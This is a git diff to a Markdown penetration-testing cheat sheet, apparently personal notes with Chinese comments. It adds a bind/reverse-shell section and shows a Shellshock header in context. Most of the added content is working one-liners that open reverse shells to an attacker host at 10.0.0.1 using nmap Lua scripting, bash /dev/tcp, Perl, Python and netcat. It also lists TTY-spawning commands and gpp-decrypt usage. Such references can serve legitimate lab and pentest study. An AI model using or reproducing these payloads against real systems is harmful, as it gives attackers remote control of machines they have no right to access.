@@ -117,7 +117,7 @@ User-Agent: () { :;}; echo; /usr/bin/python3 -c 'import os; os.system("/bin/ping
 ### Spawning a TTY Shell
 
 ```
-- python -c 'import pty; pty.spawn("/bin/sh")'
+- python3 -c 'import pty; pty.spawn("/bin/sh")'  # 首先在接收到從目標主機彈回來的Shell之後，在獲得的shell執行這動作
 - echo os.system('/bin/bash')
 - /bin/sh -i
 - perl —e 'exec "/bin/sh";'
@@ -126,6 +126,57 @@ User-Agent: () { :;}; echo; /usr/bin/python3 -c 'import os; os.system("/bin/ping
 - lua: os.execute('/bin/sh')
 - exec "/bin/sh"
 ```
+
+### [Bind Shell / Reverse Shell](https://ithelp.ithome.com.tw/articles/10279849)
+>Reverse shell是從目標主機對攻擊者主機發起連線，而Bind Shell是先在目標主機上綁定特定port，然後等來自攻擊者主機對目標主機發起連線，就像後門(backdoor)一樣
+
++ python3 -m http.server port
++ nmap
+
+```
+export RHOST=10.0.0.1
+export RPORT=1234
+TF=$(mktemp)
+echo 'local s=require("socket");
+local t=assert(s.tcp());
+t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
+while true do
+  local r,x=t:receive();local f=assert(io.popen(r,"r"));
+  local b=assert(f:read("*a"));t:send(b);
+end;
+f:close();t:close();' > $TF
+nmap --script=$TF
+```
+
++ bash
+```
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+
+> 確保目標的shell使用bash會在前面加上bash -c:
+
+bash -c `bash -i >& /dev/tcp/10.0.0.1/1234 0>&1`
+```
+
++ Perl
+```
+perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+```
+
++ Python
+
+```
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+
++ Netcat
+  + `nc -e /bin/sh 10.0.0.1 1234`
+  + `nc -nlvp port`
+  + `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f`
+
+### decrypt
++ [gpp-decrypt](https://www.kali.org/tools/gpp-decrypt/)
+> Decrypt the given Group Policy Preferences string
+`gpp-decrypt __`
 
 ### SMB
 + [smbclient](https://oldgrayduck.blogspot.com/2021/06/centos7-smbclient-windows.html?m=0)
